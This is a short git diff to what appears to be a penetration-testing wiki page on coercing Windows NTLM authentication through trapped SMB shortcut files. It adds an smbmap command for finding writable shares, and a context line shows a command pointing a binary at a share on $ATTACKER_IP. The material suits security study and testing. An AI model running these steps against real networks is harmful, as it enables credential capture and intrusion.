@@ -78,6 +78,14 @@ C:\Program Files (x86)\Trend Micro\OfficeScan Clien\PccNt.exe \\$ATTACKER_IP\s\
 SMB shares can be trapped with shortcut files that will automatically be handled by Windows' file explorer (e.g. a URL shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary). This leads to an outgoing traffic using SMB.
 
 {% hint style="info" %}
+Shares an account has WRITE privileges over can be mapped with [smbmap](https://github.com/ShawnDEvans/smbmap) (Python).
+
+```bash
+smbmap -d "domain" -u "user" -p "password" --host-file targets.txt
+```
+{% endhint %}
+
+{% hint style="info" %}
 Shortcut file names can be preprended with a `@` symbol to put them on top of the share, to make sure the file explorer has to parse it.
 {% endhint %}
 
